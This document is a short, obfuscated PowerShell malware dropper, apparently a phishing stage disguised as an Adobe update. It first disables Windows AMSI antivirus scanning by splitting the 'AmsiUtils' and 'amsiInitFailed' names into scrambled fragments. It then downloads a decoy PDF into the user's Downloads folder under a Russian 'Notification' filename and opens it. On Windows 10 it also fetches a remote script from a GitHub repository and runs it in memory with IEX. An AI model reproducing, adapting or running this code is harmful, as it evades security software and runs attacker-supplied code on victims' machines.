try {

    $uggiukP = ’Sy’
    $osiqhdcjwoc = ’.Man’
    $iouhoaiucio = ’stem’
    $iohsdvppaidhc = ’ment.’
    $iohoidsvopoapv = ’age’
    $hoisdvoapdjvhphav = ’Auto’
    $hpshdvioavpja = ’Utils’
    $ihoaivaohvjaisdhv = ’mation.’
    $oihaovoavsava = ’Am’
    $ihqoiwfoqofqfwq = ’si’


    $usdvhaoihv = ’am’
    $hoHcohchpHvp = ’In’
    $ihoahvoahvo = ’it’
    $oihaohvoahvo = ’Fa’
    $ihohasovoahv = ’il’
    $ihoahsvoihasv = ’ed’

    $hoihasohoshva = ’NonP’
    $ojpaoshvhapshvpahv = ’ubli’
    $iooaisvoaovava = ’c,’
    $ohaphvpahpvpJcC = ’Sta’
    $iasovosaivavspajv = ’tic’




    [Ref].Assembly.GetType($uggiukP + $iouhoaiucio + $osiqhdcjwoc + $iohoidsvopoapv + $iohsdvppaidhc + $hoisdvoapdjvhphav + $ihoaivaohvjaisdhv + $oihaovoavsava + $ihqoiwfoqofqfwq + $hpshdvioavpja).GetField(($usdvhaoihv + $ihqoiwfoqofqfwq + $hoHcohchpHvp + $ihoahvoahvo + $oihaohvoahvo + $ihohasovoahv + $ihoahsvoihasv), ($hoihasohoshva + $ojpaoshvhapshvpahv + $iooaisvoaovava + $ohaphvpahpvpJcC + $iasovosaivavspajv)).SetValue($null, $true)
}
finally {



    $lwoxheihwic = “https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/randompdf.pdf”

    $ishscjsof = ’https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib207.ps1’



    $path = $env:USERPROFILE + “\Downloads\Уведомление.pdf”
(New-Object System.Net.WebClient).DownloadFile($lwoxheihwic, $path)
    Start-Process -F $path





    $OSVersion = (Get-WmiObject Win32_OperatingSystem).Caption
        
    if ($OSVersion -match "10") {
        IEX ((new-object net.webclient).downloadstring($ishscjsof))
    }



}
